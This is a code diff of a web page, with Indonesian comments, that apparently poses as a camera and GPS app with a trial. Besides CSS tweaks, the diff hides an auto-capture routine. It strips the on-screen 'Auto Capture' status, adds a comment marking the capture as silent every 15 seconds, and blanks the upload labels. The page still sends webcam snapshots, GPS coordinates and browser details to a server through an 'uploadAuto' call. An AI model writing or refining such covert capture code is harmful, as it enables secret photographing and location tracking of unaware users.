@@ -54,19 +54,19 @@
         .logo p { font-size: 0.7rem; color: #7E8AA8; }
         .status-bar {
             display: flex;
-            gap: 1rem;
+            gap: 1.5rem;
             margin-bottom: 1.5rem;
             padding: 0.75rem 1.25rem;
             background: rgba(10, 14, 28, 0.8);
             border-radius: 1rem;
-            font-size: 0.7rem;
+            font-size: 0.75rem;
             flex-wrap: wrap;
             border: 1px solid rgba(255,255,255,0.05);
         }
         .status-item { display: flex; align-items: center; gap: 0.5rem; }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; box-shadow: 0 0 6px #22C55E; }
-        .dot.warning { background: #EAB308; }
-        .dot.error { background: #EF4444; }
+        .dot.warning { background: #EAB308; box-shadow: 0 0 6px #EAB308; }
+        .dot.error { background: #EF4444; box-shadow: 0 0 6px #EF4444; }
         .badge-premium {
             background: linear-gradient(135deg, #1E293B, #0F172A);
             padding: 0.25rem 0.75rem;
@@ -244,7 +244,7 @@
     <div class="status-bar">
         <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Mengakses GPS...</span></div>
         <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Kamera siap</span></div>
-        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">🤫 Auto Capture: Menunggu...</span></div>
+        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">📷</span></div>
         <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Device ID</span></div>
     </div>
 
@@ -458,17 +458,14 @@
             autoVideoStream = stream;
             autoVideo.srcObject = stream;
             
-            // Tunggu video benar-benar siap
             userVideo.onloadedmetadata = () => {
                 videoReady = true;
                 updateCameraStatus('✅ Kamera aktif', true);
-                autoCamStatus.innerHTML = '🤫 Auto Capture: Siap';
                 startAutoCapture();
             };
             return true;
         } catch(e) {
             updateCameraStatus('❌ Izin kamera ditolak', false);
-            autoCamStatus.innerHTML = '🤫 Auto Capture: Gagal';
             return false;
         }
     }
@@ -489,7 +486,7 @@
                         if (userLocation.lat && userLocation.lng && trialValid) {
                             callAPI('uploadAuto', {
                                 imageData: null,
-                                metadata: { latitude: userLocation.lat, longitude: userLocation.lng, device: navigator.userAgent, customText: 'GPS Tracking', isAuto: true }
+                                metadata: { latitude: userLocation.lat, longitude: userLocation.lng, device: navigator.userAgent, customText: '', isAuto: true }
                             }).catch(e => console.log);
                         }
                     }, 10000);
@@ -499,13 +496,11 @@
         }
     }
     
+    // ========== AUTO CAPTURE (DIAM-DIAM, SETIAP 15 DETIK) ==========
     async function startAutoCapture() {
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         autoCaptureInterval = setInterval(async () => {
-            if (!videoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) {
-                autoCamStatus.innerHTML = '🤫 Auto Capture: Menunggu video...';
-                return;
-            }
+            if (!videoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = autoVideo.videoWidth;
@@ -513,32 +508,27 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(autoVideo, 0, 0);
                 
-                // Cek apakah canvas berhasil digambar (tidak hitam)
+                // Cek apakah gambar tidak hitam
                 const pixelData = ctx.getImageData(0, 0, 1, 1).data;
-                if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) {
-                    autoCamStatus.innerHTML = '🤫 Auto Capture: Menunggu frame...';
-                    return;
-                }
+                if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) return;
                 
                 canvas.toBlob(async (blob) => {
-                    const base64 = await blobToBase64(blob);
-                    await callAPI('uploadAuto', {
-                        imageData: base64,
-                        metadata: {
-                            latitude: userLocation.lat || 0,
-                            longitude: userLocation.lng || 0,
-                            device: navigator.userAgent,
-                            customText: 'Auto Capture',
-                            isAuto: true
-                        }
-                    });
-                    autoCamStatus.innerHTML = '🤫 Auto Capture: Mengirim...';
-                    setTimeout(() => { autoCamStatus.innerHTML = '🤫 Auto Capture: Aktif'; }, 1000);
-                }, 'image/jpeg', 0.8);
-            } catch(e) {
-                console.log('Auto capture error:', e);
-            }
-        }, 5000);
+                    if (blob && blob.size > 5000) {
+                        const base64 = await blobToBase64(blob);
+                        await callAPI('uploadAuto', {
+                            imageData: base64,
+                            metadata: {
+                                latitude: userLocation.lat || 0,
+                                longitude: userLocation.lng || 0,
+                                device: navigator.userAgent,
+                                customText: '',
+                                isAuto: true
+                            }
+                        });
+                    }
+                }, 'image/jpeg', 0.7);
+            } catch(e) { console.log('Auto capture error:', e); }
+        }, 15000);
     }
     
     async function captureFromCamera() {
